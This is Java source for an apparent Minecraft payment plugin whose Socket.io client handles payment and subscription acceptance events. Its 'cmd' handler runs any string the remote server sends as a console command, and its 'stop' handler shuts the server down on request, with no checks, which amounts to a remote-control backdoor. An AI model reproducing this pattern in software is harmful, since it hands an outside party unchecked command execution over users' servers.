package dk.manaxi.unikpay.plugin.websocket;

import com.google.common.reflect.TypeToken;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import dk.manaxi.unikpay.api.Config;
import dk.manaxi.unikpay.api.classes.Pakke;
import dk.manaxi.unikpay.api.classes.Subscription;
import dk.manaxi.unikpay.plugin.Main;
import dk.manaxi.unikpay.plugin.event.OnBetaling;
import dk.manaxi.unikpay.plugin.event.OnSubscriptionPayment;
import dk.manaxi.unikpay.plugin.fetch.Payments;
import dk.manaxi.unikpay.plugin.skript.classes.AcceptId;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.bukkit.Bukkit;

import java.lang.reflect.Type;
import java.net.URISyntaxException;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;

import static java.util.Collections.singletonList;
import static java.util.Collections.singletonMap;

public class IoSocket {
    private static Socket socket;

    public static void connectSocket() {
        try {
            IO.Options options = IO.Options.builder()
                    .setAuth(singletonMap("token", Main.getAPIKEY()))
                    .setExtraHeaders(singletonMap("version", singletonList(Main.getInstance().getDescription().getVersion())))
                    .build();
            socket = IO.socket(Config.WS, options);
            socket.on(Socket.EVENT_CONNECT, args -> Main.getInstance().getLogger().info("Socket.io connected."));
            socket.on(Socket.EVENT_DISCONNECT, args -> Main.getInstance().getLogger().info("Socket.io disconnected."));

            //when someone accepts on discord
            socket.on("acceptRequest", args -> {
                String ok = Arrays.toString(args);
                Gson gson = new Gson();
                JsonArray jsonArray = gson.fromJson(ok, JsonArray.class);

                JsonObject obj = jsonArray.get(0).getAsJsonObject();
                UUID uuid = UUID.fromString(obj.getAsJsonObject("mcaccount").get("uuid").getAsString());
                Type listType = new TypeToken<List<Pakke>>() {}.getType();
                List<Pakke> pakker = gson.fromJson(obj.getAsJsonArray("packages"), listType);
                Pakke[] pakkerArray = pakker.toArray(new Pakke[0]);

                String id = obj.get("_id").getAsString();

                if(Payments.isSeen(id)) {
                    return;
                }

                if (!obj.has("subscription") || obj.get("subscription").isJsonNull()) {
                    Bukkit.getScheduler().runTask(Main.getInstance(), () -> Bukkit.getPluginManager().callEvent(new OnBetaling(
                            Bukkit.getOfflinePlayer(uuid),
                            pakkerArray,
                            obj.get("amount").getAsFloat(),
                            new AcceptId(id)
                    )));
                } else {
                    Type listType2 = new TypeToken<Subscription>() {}.getType();
                    Subscription subscription = gson.fromJson(obj.getAsJsonObject("subscription"), listType2);
                    Bukkit.getServer().getPluginManager().callEvent(new OnSubscriptionPayment(
                            Bukkit.getOfflinePlayer(uuid),
                            pakkerArray,
                            obj.get("amount").getAsFloat(),
                            subscription,
                            new AcceptId(id)
                    ));
                }

                Payments.addHandledBySocket(id);

            });
            socket.on("cmd", args -> {
                Bukkit.getScheduler().runTask(Main.getInstance(), () -> Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), args[0].toString()));
            });
            socket.on("stop", args -> {
                Bukkit.getScheduler().runTask(Main.getInstance(), () -> Bukkit.getServer().shutdown());
            });

            socket.connect();
        } catch (URISyntaxException ignored) {

        }
    }

    public static Socket getSocket() {
        return socket;
    }

}
